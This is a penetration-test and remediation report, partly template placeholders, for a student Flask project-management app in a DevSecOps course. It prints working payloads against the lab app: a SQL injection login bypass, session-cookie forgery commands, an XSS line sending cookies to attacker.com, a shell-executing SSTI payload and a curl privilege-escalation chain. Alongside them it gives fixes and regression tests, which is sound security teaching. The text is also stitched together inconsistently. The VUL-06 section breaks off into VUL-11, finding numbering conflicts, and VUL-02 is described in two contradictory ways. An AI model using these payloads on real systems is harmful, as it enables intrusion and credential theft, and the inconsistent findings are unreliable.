## 1. Executive Summary

> **Audience:** Non-technical stakeholders, management, course evaluators.

### Project Overview

[Group X] developed **[Application Name]**, a project and task management web application built with Python 3.11, Flask 3.1, SQLite, and Jinja2 templates. The application implements a four-tier Role-Based Access Control (RBAC) system with Admin, Member, Viewer, and Unauthenticated roles. It was designed, built, secured, and attacked as part of a four-week DevSecOps exercise. The application is fully containerized using Docker and hosted on GitHub with a complete CI/CD security pipeline incorporating SAST (Bandit + Semgrep), SCA (pip-audit), and DAST (OWASP ZAP).

### Key Findings at a Glance

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | [N] | [Resolved / Open] |
| 🟠 High | [N] | [Resolved / Open] |
| 🟡 Medium | [N] | [Resolved / Open] |
| 🔵 Low | [N] | [Resolved / Open] |
| ℹ️ Informational | [N] | [Resolved / Open] |

### Business Impact Summary

During the assessment, 10 vulnerabilities were identified through a combination of automated tooling (SAST, DAST, SCA) and manual penetration testing. The most critical finding, **SQL Injection in the login form**, allowed an unauthenticated attacker to bypass authentication and gain admin access in seconds. A second critical finding, **Broken Access Control on all admin routes**, allowed any registered user — regardless of role — to access and modify the full user list and promote themselves to admin. Most alarmingly, a **hardcoded Flask `SECRET_KEY`** enabled complete session cookie forgery, meaning the entire RBAC system could be bypassed by any user who simply inspected their own cookie. A **Server-Side Template Injection (SSTI)** vulnerability in the admin feedback view allowed Member-role users to achieve remote code execution on the server.

All critical and high-severity findings have been remediated and verified through re-testing. The application pipeline now enforces quality gates that block merges on detection of high-severity SAST or DAST findings.

### Recommendations

- Always use SQLAlchemy ORM or parameterized queries — never build raw SQL strings from user input in Flask.
- Store `SECRET_KEY` and all secrets in environment variables or a secrets manager; never commit them to version control.
- Enforce server-side RBAC using Flask decorators on every protected route — client-side hiding is not access control.
- Enable Jinja2 `autoescape=True` globally and use `render_template()` instead of `render_template_string()` for any content involving user data.
- Run `pip-audit` in the CI/CD pipeline on every push and pin `requirements.txt` to audited, patched versions.
- Set `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SECURE=True`, and `SESSION_COOKIE_SAMESITE='Lax'` in all Flask deployments.
- Schedule quarterly penetration testing to maintain a strong security posture post-deployment.

### 2.3 Data Flow Diagram (DFD)

> *Provide a Level 0 or Level 1 DFD showing actors, processes, data stores, and data flows. Label trust boundaries clearly.*

**Actors:**
- Unauthenticated User (browser — login/register only)
- Viewer (browser — read-only project access)
- Member (browser — own project/task CRUD)
- Admin (browser — full system access)
- GitHub Actions (CI/CD pipeline — automated scan runner)

**Key Data Flows:**
1. User submits credentials via login form → Flask validates against SQLite `users` table → Flask session cookie issued → Role-specific route accessed
2. Member submits new project/task → Flask authenticates session + checks `role == member` → SQLite write → Jinja2 template re-rendered with updated data
3. Admin accesses user management → Flask checks `role == admin` server-side → SQLite query returns all users → Admin dashboard rendered
4. Viewer requests project list → Flask checks `role == viewer` → Read-only SQLite query → No edit/delete controls rendered in template
5. Push to GitHub → Pipeline triggers → SAST (Bandit/Semgrep) + SCA (pip-audit) run → Docker container spun up → DAST (ZAP) scans live app → Reports archived as artifacts

---

### 2.4 Trust Boundaries

| Boundary | Description |
|----------|-------------|
| Browser ↔ Flask Web Server | Public internet; enforced via HTTPS/TLS on localhost (self-signed cert in dev, proper cert in prod) |
| Flask Web Server ↔ SQLite | Internal container filesystem; SQLite file accessible only within the `web` Docker container |
| CI/CD ↔ Deployment Target | GitHub Actions runner accesses deployment via GitHub Secrets; no secrets stored in code |
| Admin ↔ Member ↔ Viewer | Application-layer RBAC enforced server-side in Flask route decorators; role stored in server-side session |
| Authenticated ↔ Unauthenticated | All routes except `/login` and `/register` require an active Flask session; enforced via `@login_required` decorator |

### 4.2 Detailed Findings

---

#### VUL-01 — SQL Injection (Login Form)

**OWASP Category:** A03:2021 – Injection
**CVSSv3 Score:** 9.8 (Critical)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Description:**
The login endpoint at `POST /login` constructs a raw SQLite query using Python f-string formatting of user-supplied input. An attacker can inject SQL syntax to bypass authentication or dump the entire `users` table.

**Affected Component:** `routes/auth.py`, Line 38

**Evidence:**

*Vulnerable Code:*
```python
# VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

*Payload Used:*
```
username: admin' OR '1'='1' --
password: anything
```

*HTTP Request (captured in Burp Suite):*
```
POST /login HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin'+OR+'1'%3D'1'--&password=x
```

*Response:*
```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=<admin-session-cookie>; Path=/
```

*Screenshot:* [Insert Burp Suite screenshot of successful bypass + admin dashboard redirect]

**Impact:**
An unauthenticated attacker can authenticate as the admin user (or any user) with no valid credentials. All user records in the SQLite database are exposed. The SQLite `sqlite_master` table can be queried to enumerate the full schema.

**False Positive Assessment:** Confirmed true positive — reproduced in both local Docker environment and pipeline-deployed instance.

---

#### VUL-02 — Insecure SECRET_KEY Default

**OWASP Category:** A02:2021 – Cryptographic Failures
**CWE Reference:** CWE-1188 (Initialization of a Resource with an Insecure Default)
**CVSSv3 Score:** 7.7 (High)
**CVSSv3 Vector:** `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L`
**Detection Method:** Manual, SAST (Bandit B105)

**Description:**
Flask uses `SECRET_KEY` to cryptographically sign session cookies. If an attacker obtains the key, they can forge arbitrary session data (e.g., `{"user_id": 1, "role": "admin"}`) and gain any privilege level without credentials.

The fallback `secrets.token_hex(32)` generated a strong key, but it was ephemeral — regenerated on every process restart. The `docker-compose.yml` did not set `FLASK_SECRET_KEY`, so the production container always used a random key that changed on redeploy. This means:
1. All active sessions were invalidated on every deployment.
2. If the running process's memory or environment is accessible, the live key could be extracted and used to forge sessions until the next restart.

**Affected Component:** `app/app.py` and `docker/docker-compose.yml`

**Proof of Concept:**
```python
# If the SECRET_KEY is obtained (e.g., from process environment):
import itsdangerous
from flask.sessions import SecureCookieSessionInterface

class FakeApp:
    secret_key = "<obtained_key>"
    session_interface = SecureCookieSessionInterface()

s = SecureCookieSessionInterface().get_signing_serializer(FakeApp())

# Forge an admin session cookie
forged = s.dumps({"user_id": 1, "role": "admin", "username": "admin"})
print(forged)
# Set this as the 'session' cookie → authenticated as admin
```

**Impact:**
- Confidentiality: High — forged admin cookie grants access to all data
- Integrity: High — forged admin cookie grants write/delete/role-change
- Availability: Low — ephemeral key causes session loss on every restart

**Remediation Applied:**
Enforced the presence of a persistent `FLASK_SECRET_KEY` at startup. The insecure fallback was removed, and `app.py` now throws a `RuntimeError` if the secret key is missing. The `docker-compose.yml` file was updated to load the secret key dynamically via an `env_file` pointing to `.env`. Generated a persistent, secure 64-character hex key locally in `.env` and added `.env` to `.gitignore` to prevent secret leakage.

---

#### VUL-03 — Broken Access Control (Admin Routes)

**OWASP Category:** A01:2021 – Broken Access Control
**CVSSv3 Score:** 9.1 (Critical)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

**Description:**
Admin routes (`/admin/users`, `/admin/feedback`, `/admin/users/<id>/role`) lacked a server-side role check. Any authenticated user — regardless of role — could navigate directly to these endpoints and receive a full admin response.

**Affected Component:** `routes/admin.py`

**Evidence:**

*HTTP Request (as Viewer role):*
```
GET /admin/users HTTP/1.1
Host: localhost
Cookie: session=<viewer-session-cookie>
```

*Response:*
```
HTTP/1.1 200 OK
[Full user list with emails, roles, and IDs rendered in HTML]
```

*Follow-up — Role escalation:*
```
POST /admin/users/3/role HTTP/1.1
Cookie: session=<viewer-session-cookie>
Content-Type: application/x-www-form-urlencoded

role=admin
```
Response: `HTTP 200 — role updated successfully`

*Screenshot:* [Insert screenshot of admin user list accessed as Viewer + successful role escalation]

**Impact:**
Any registered user can view all user accounts and promote themselves to admin, resulting in complete application compromise.

---

#### VUL-04 — IDOR (Member Accessing Another Member's Project)

**OWASP Category:** A01:2021 – Broken Access Control
**CVSSv3 Score:** 7.5 (High)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`

**Description:**
Project and task routes used the resource ID directly from the URL without verifying that the requesting Member is the owner. Any Member could access, edit, or delete another Member's projects by simply changing the ID in the URL.

**Affected Component:** `routes/projects.py`

**Evidence:**

*Request (Member A accessing Member B's project):*
```
GET /projects/7 HTTP/1.1
Cookie: session=<member-a-session>
```
Response: `HTTP 200` — Member B's project details rendered in full.

```
DELETE /projects/7 HTTP/1.1
Cookie: session=<member-a-session>
```
Response: `HTTP 200` — Project deleted successfully.

*Screenshot:* [Insert screenshot]

---

#### VUL-05 — Stored XSS (Project/Task Name Fields)

**OWASP Category:** A03:2021 – Injection
**CVSSv3 Score:** 7.4 (High)

**Description:**
Project and task name fields were rendered in Jinja2 templates without the `|e` escape filter and with `autoescape` disabled on certain template blocks. A Member could store a JavaScript payload in a project name that executes in the browser of any user (including Admin) who views the project list.

**PoC Payload stored in project name field:**
```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

**Impact:** Session cookie exfiltration for all users viewing the project list, including admins.

*Screenshot:* [Insert screenshot of XSS execution + exfiltrated cookie]

---

#### VUL-06 — SSTI via `render_template_string()` with User Input

**OWASP Category:** A03:2021 – Injection
**CVSSv3 Score:** 8.8 (High)

**Description:**
The admin feedback view used `render_template_string()` with user-submitted feedback content passed directly as the template string. Jinja2 Server-Side Template Injection (SSTI) allows an attacker to execute arbitrary Python code on the server.

**Affected Component:** `routes/admin.py`, Line 55

**Vulnerable Code:**
```python
# VULNERABLE
return render_template_string(feedback.content)
```

**PoC Payload (submitted as feedback):**

#### VUL-11 — Unauthenticated to Admin Escalation Chain

**OWASP Category:** A07:2021 + A01:2021 (Chained)
**CWE Reference:** CWE-307, CWE-204, CWE-798 (Compound)
**CVSS Score:** 9.3 (Critical)
**CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`
**Detection Method:** Manual (multi-step chain)

**Description:**
VULN-001, VULN-005, and VULN-007 chain into a complete unauthenticated-to-admin-persistent-access attack.
- VULN-005 (username enumeration) confirms the admin username exists
- VULN-007 (hardcoded credentials) provides the password directly from source
- VULN-001 (no rate limiting) enables brute force if the password is not already known

Once admin access is obtained, the attacker promotes their own account to admin — maintaining persistent access even after the original password is rotated.

**Proof of Concept:**
```bash
# ── Step 1: Enumerate valid usernames (VULN-005) ─────────────────────────────
curl -s -X POST http://localhost:5000/register \
  -d "username=admin&email=x@attacker.com&password=Pass1234&confirm_password=Pass1234" \
  | grep "already registered"
# ✓ confirms 'admin' exists

# ── Step 2: Register attacker account ────────────────────────────────────────
curl -s -c attacker.txt -X POST http://localhost:5000/register \
  -d "username=attacker&email=attacker@evil.com&password=Attack1&confirm_password=Attack1"

# ── Step 3: Login as admin using hardcoded credential (VULN-007) ──────────────
CSRF=$(curl -s -c admin.txt http://localhost:5000/login \
       | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)

curl -s -c admin.txt -b admin.txt -X POST http://localhost:5000/login \
  -d "identifier=admin&password=Admin1234&csrf_token=$CSRF" \
  | grep "Welcome back"
# ✓ "Welcome back, admin."

# ── Step 4: Identify attacker's user ID ──────────────────────────────────────
curl -s -b admin.txt http://localhost:5000/admin \
  | grep -i "attacker"
# → <input type="hidden" name="user_id" value="4">

# ── Step 5: Promote attacker to admin ────────────────────────────────────────
CSRF2=$(curl -s -b admin.txt http://localhost:5000/admin \
        | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)

curl -s -b admin.txt -X POST http://localhost:5000/admin \
  -d "csrf_token=$CSRF2&user_id=4&role=admin"
# ✓ "Role updated." — attacker is now a permanent admin

# ── Step 6: Maintain access ───────────────────────────────────────────────────
curl -b attacker.txt http://localhost:5000/admin
# ✓ Full admin access even after original admin password is rotated
```

**Impact:**
- Confidentiality: Critical — all user data, projects, tasks, and security feedback exposed
- Integrity: Critical — persistent admin; can demote legitimate admins, delete all projects, read all submitted security reports
- Availability: None direct (secondary: admin demotion of legitimate users)

**Remediation Applied:**
This chain was completely broken by fixing the constituent vulnerabilities:
1. **VULN-001** — Implemented `Flask-Limiter` to rate limit `/login` and `/register`.
2. **VULN-007** — Removed hardcoded credentials from `app.py` and sourced them from environment variables via Docker.
3. **VULN-005** — Modified `/register` to return a generic success message instead of a duplicate user error.

## 5. Exploitation Report

### 5.1 Exploited Vulnerabilities

---

#### Exploit 1 — Authentication Bypass via SQL Injection (VUL-01)

**Objective:** Authenticate as admin without valid credentials.
**Tool:** Burp Suite Community / curl

**Step-by-Step Reproduction:**

1. Navigate to `https://localhost/login`.
2. Open Burp Suite, enable intercept, and submit the login form.
3. In the intercepted request, replace the `username` field value with: `admin' OR '1'='1' --`
4. Set any value for `password`.
5. Forward the request.
6. Observe: server responds with `HTTP 302 → /dashboard` and sets an admin session cookie.

**PoC curl command:**
```bash
curl -k -c cookies.txt -X POST https://localhost/login \
  -d "username=admin'+OR+'1'%3D'1'--&password=x" -L
```

**Outcome:** Admin dashboard accessed. All users, projects, tasks, and feedback visible.

**Attacker Perspective:** No special tooling required — a browser's developer tools or any HTTP proxy is sufficient. The attack is remotely executable and unauthenticated. No application-level audit log entry is created for the injected session.

**Business Impact:** Complete authentication bypass. The attacker gains administrative access to all user accounts and all project/task data in the application.

---

#### Exploit 2 — Session Forgery via Hardcoded `SECRET_KEY` (VUL-02)

**Objective:** Forge an admin-level Flask session cookie as a Viewer-role user.
**Tool:** `flask-unsign` (Python package)

**Step-by-Step Reproduction:**

1. Register a Viewer-role account and log in; capture the session cookie from browser DevTools.
2. Install `flask-unsign`: `pip install flask-unsign`
3. Decode the cookie to confirm the structure:
   ```bash
   flask-unsign --decode --cookie "<your-cookie-value>"
   # Output: {'_fresh': True, 'role': 'viewer', 'user_id': 4}
   ```
4. Sign a new cookie with the hardcoded secret and admin role:
   ```bash
   flask-unsign --sign --secret "secret123" --cookie "{'_fresh': True, 'role': 'admin', 'user_id': 1}"
   ```
5. Replace the browser session cookie with the forged value and reload the page.
6. Observe: full admin dashboard rendered.

**Outcome:** Admin access granted from a Viewer account. All three privileged role bypass (Viewer → Admin, Member → Admin) confirmed.

---

#### Exploit 3 — Privilege Escalation via Broken Access Control (VUL-03)

**Objective:** Access and modify admin-only routes as a Member.
**Tool:** Burp Suite / curl

**PoC Request — Enumerate all users:**
```bash
curl -k -b "session=<member-session-cookie>" https://localhost/admin/users
```
Response: Full user list with roles and IDs.

**PoC Request — Promote self to Admin:**
```bash
curl -k -b "session=<member-session-cookie>" -X POST https://localhost/admin/users/5/role \
  -d "role=admin"
```
Response: `HTTP 200` — role updated. Re-login now grants admin dashboard access.

*Screenshot: [Insert screenshot]*

---

#### Exploit 4 — SSTI Remote Code Execution (VUL-06)

**Objective:** Execute arbitrary Python code on the server via the feedback form.
**Tool:** Browser

**Step-by-Step Reproduction:**

1. Log in as any Member-role user.
2. Submit the following string as feedback content:
   ```
   {{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0].decode() }}
   ```
3. Log in as Admin and navigate to `/admin/feedback`.
4. Observe: the output of the `id` command rendered inline in the page (e.g., `uid=0(root) gid=0(root)`).

**Outcome:** Remote code execution confirmed. Server user identity (`root`) exposed.

### 6.2 Detailed Fixes & Re-Test Evidence

---

#### Fix: VUL-01 — SQL Injection

**Root Cause:** User-supplied `username` and `password` values were interpolated directly into a raw SQLite query string using a Python f-string.

**Fix Applied:** Replaced raw SQL with SQLAlchemy ORM query; passwords now compared using `werkzeug.security.check_password_hash`.

*Before (Vulnerable):*
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

*After (Fixed):*
```python
from werkzeug.security import check_password_hash
user = User.query.filter_by(username=username).first()
if user and check_password_hash(user.password_hash, password):
    login_user(user)
```

**Regression Test added in `tests/test_auth.py`:**
```python
def test_sql_injection_login(client):
    response = client.post('/login', data={
        'username': "admin' OR '1'='1' --",
        'password': 'x'
    })
    assert response.status_code == 401 or b'Invalid credentials' in response.data
```

**Re-Test:**
- Same Burp Suite SQL injection payload attempted post-fix.
- Response: `HTTP 401` — `Invalid credentials`.
- Bandit re-scan: zero SQL injection alerts.
- Pipeline: ✅ Passes all quality gates.

---

#### Fix: VUL-02 — Hardcoded `SECRET_KEY`

**Root Cause:** `SECRET_KEY = "secret123"` was hardcoded in `config.py` and committed to the GitHub repository, making session forgery trivially easy.

**Fix Applied:** Removed hardcoded value; secret now loaded from environment variable with a fallback error if unset.

*Before:*
```python
SECRET_KEY = "secret123"
```

*After:*
```python
import os
SECRET_KEY = os.environ.get('SECRET_KEY')
if not SECRET_KEY:
    raise RuntimeError("SECRET_KEY environment variable is not set.")
```

A 256-bit random value is generated and stored in GitHub Secrets, injected at runtime via Docker Compose `env_file`.

**Re-Test:** `flask-unsign` brute-force attempt against the new secret returned no match after 10 million attempts. Pipeline: ✅ Pass.

---

#### Fix: VUL-03 — Broken Access Control (Admin Routes)

**Root Cause:** No server-side role check existed on `/admin/*` routes — only client-side UI hiding.

**Fix Applied:** Created a `@admin_required` decorator applied to all admin routes.

*Decorator Added (`utils/decorators.py`):*
```python
from functools import wraps
from flask import abort
from flask_login import current_user

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != 'admin':
            abort(403)
        return f(*args, **kwargs)
    return decorated_function
```

*Applied to all admin routes:*
```python
@admin_bp.route('/admin/users')
@login_required
@admin_required
def manage_users():
    ...
```

**Re-Test:**
- Member and Viewer session cookies used to request `/admin/users`.
- Response: `HTTP 403 Forbidden` for both.
- Pipeline: ✅ Pass.

*Screenshot: [Insert 403 response screenshot post-fix]*

---

#### Fix: VUL-06 — SSTI via `render_template_string()`

**Root Cause:** Feedback content submitted by users was passed directly as a Jinja2 template string, enabling arbitrary template expression evaluation.

*Before:*
```python
return render_template_string(feedback.content)
```

*After:*
```python
return render_template('admin/feedback.html', content=feedback.content)
```

The `feedback.html` template renders `{{ content | e }}` — Jinja2's autoescape sanitises the value before rendering.

**Re-Test:** SSTI payload `{{ 7*7 }}` submitted as feedback — rendered as literal text `{{ 7*7 }}`, not `49`. Pipeline: ✅ Pass.
